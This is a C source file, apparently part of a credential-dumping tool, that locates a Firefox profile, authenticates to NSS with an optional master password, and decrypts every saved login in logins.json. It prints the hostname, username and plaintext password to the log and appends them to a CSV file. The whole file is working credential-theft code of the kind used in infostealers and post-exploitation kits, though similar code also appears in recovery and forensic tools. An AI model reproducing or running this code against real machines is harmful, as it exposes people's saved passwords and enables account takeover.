#include "firefox.h"
#include "main.h"

#include "log.h"
#include "json.h"

/**
 * Main function to dump firefox creds
 *
 * @return 1 on success, -1 on failure 
 */
int get_firefox_creds(char *profile_path, char *logins_path, const char *output_file, const char *master_password) {
	void* key_slot = NULL; 
	if((nss_authenticate(profile_path, key_slot, master_password)) == -1) {
		log_error("nss_authenticate failure()");
		return -1;
	}

	char *json;
	if(parse_json(logins_path, &json) == -1) {
		log_error("parse_json failed()");
		return -1;
	}

	cJSON* values = cJSON_Parse(json);
	if(values == NULL) {
		log_error("cJSON_Parse() failed");
		fflush(stderr);
		return -1;
	}

	cJSON *logins_array = NULL;
	cJSON *logins = NULL;
	cJSON *hostname = NULL; 	
	cJSON *cipher_username = NULL;
	cJSON *cipher_password = NULL;

	char *username, *password;

	logins_array = cJSON_GetObjectItemCaseSensitive(values, "logins");	

	FILE *output_fd = NULL;
	if(output_file != NULL) {
		output_fd = fopen(output_file, "ab");
	}

	cJSON_ArrayForEach(logins, logins_array) {
		hostname = cJSON_GetObjectItemCaseSensitive(logins, "hostname");	
		cipher_username = cJSON_GetObjectItemCaseSensitive(logins, "encryptedUsername");	
		cipher_password = cJSON_GetObjectItemCaseSensitive(logins, "encryptedPassword");	

		if (cJSON_IsString(cipher_username) && cJSON_IsString(cipher_password) && cJSON_IsString(hostname)) {
			if(strlen(hostname->valuestring) > 0) {
				decrypt_firefox_cipher(cipher_username->valuestring, &username);
				decrypt_firefox_cipher(cipher_password->valuestring, &password);

				log_success("Website : %s", hostname->valuestring);
				log_success("Username : %s", username);
				log_success("Password : %s\n", password);

				if(output_file != NULL) {
					fprintf(output_fd, "\"%s\",\"%s\",\"%s\"\n", 
						hostname->valuestring,
						username,
						password);
				}

				free(username);
				free(password);
			}
		}
	}

	// We free the memory of everything.	
	if(output_file != NULL) {
		fclose(output_fd);
	}
	free(json);
	free_pk11_nss(key_slot);
	
	return 1;
}

/**
 * Firefox functions wrapper that sets up everything we need
 *
 * @return 1 on success, -1 on failure 
 */
int dump_firefox(const char *output_file, const char *master_password) {
	log_info("Starting Firefox dump ...\n");

	int result = 0;
	char firefox_path[MAX_PATH_SIZE];
	char profiles_ini_path[MAX_PATH_SIZE];
	char profile[MAX_PATH_SIZE];
	char profile_path[MAX_PATH_SIZE];
	char logins_path[MAX_PATH_SIZE];

	load_firefox_paths(firefox_path, profiles_ini_path);

	if(get_profile(profiles_ini_path, profile) == -1) {
		log_error("get_profile() failure");
		log_error("Couldn't find any Firefox installation (No profile found)");
		return -1;
	}

	snprintf(profile_path, MAX_PATH_SIZE, "%s%s%s", firefox_path, "/", profile);
	snprintf(logins_path, MAX_PATH_SIZE, "%s/logins.json", profile_path);
	
	// TODO: S_OK / F_OK
	if(access(logins_path, 0) != -1) {
	    log_verbose("Firefox path : %s", logins_path);
		log_info("Starting Firefox credentials dump\n");
		result = get_firefox_creds(profile_path, logins_path, output_file, master_password);
	}

	if(result == -1) {
		log_error("An error occured");
		return -1;
	}
	else if(result == 0) {
		log_error("Couldn't find any Firefox installation (No logins.json file found)");
		return -1;
	}
	return 1;
}
